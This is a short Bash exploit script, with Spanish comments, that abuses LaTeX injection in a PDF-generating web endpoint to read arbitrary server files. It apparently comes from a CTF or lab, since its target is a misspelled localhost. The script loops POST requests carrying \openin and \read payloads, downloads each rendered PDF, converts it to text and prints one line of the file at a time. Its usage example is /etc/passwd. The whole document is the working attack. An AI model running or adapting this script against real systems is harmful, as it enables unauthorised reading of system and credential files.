#!/bin/bash

# Variables globales
declare -r main_url="http://loaclhost/ajax.php"
filename=$1

if [ $1 ]; then
    read_file_to_line="%0A\read\file%20to\line"
    for i in $(seq 1 100); do
        file_to_download=$(curl -a -X POST $main_url -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -d "content=\newread\file%0A\openin\files=$filename$read_file_to_line%0A\text{\line}%0A\closein\file&template=blank" | grep -i download | awk 'NF{print $NF}')

        if [ $file_to_download ]; then
            wget $file_to_download &>/dev/null
            file_to_convert=$(echo $file_to_download | tr '/' ' ' | awk 'NF{print $NF}')
            pdftotext $file_to_convert
            file_to_read=$(echo $file_to_convert | sed 's/\.pdf/\.txt/')
            rm $file_to_convert
            cat $file_to_read | head -n 1
            rm $file_to_read
            read_file_to_line+="%0A\read\file%20to\line"
        else
            read_file_to_line+="%0A\read\file%20to\line"
        fi
    done
else
    echo -e "\n[!] Uso: $0 /etc/passwd\n\n"
fi

